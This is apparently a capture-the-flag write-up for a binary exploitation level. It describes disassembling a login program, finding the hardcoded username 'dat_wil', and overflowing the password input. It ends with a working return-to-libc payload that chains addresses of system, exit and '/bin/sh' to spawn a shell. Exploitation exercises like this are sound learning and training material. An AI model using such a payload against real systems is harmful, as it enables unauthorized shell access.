```
after disassembling the main function it makes a call to two functions verify_username and verify_user_pass
```
![](./Resources/verifyUsername.png)
```
disassembling the function verify_username we can notice that it makes a comparaison between our input and the value "dat_wil"
```

![](./Resources/verifyPassword.png)
```
disassembling the function verify_user_pass we can notice that it makes a comparaison between our input and the value "admin"


but the function main  takes the return of verify_user_pass and nomatter what value it get it will throw incorect password
```

```
i will be trying to overflow the input of the password and see if i can override the instruction pointer and maybe apply a return to libc technique

after figuring out the offset of the instruction pointer we can collect the addresse of system , exit and the string "/bin/sh"

and craft our payload : 

(python -c 'print "dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" '; cat )| /home/users/level01/./level01
```
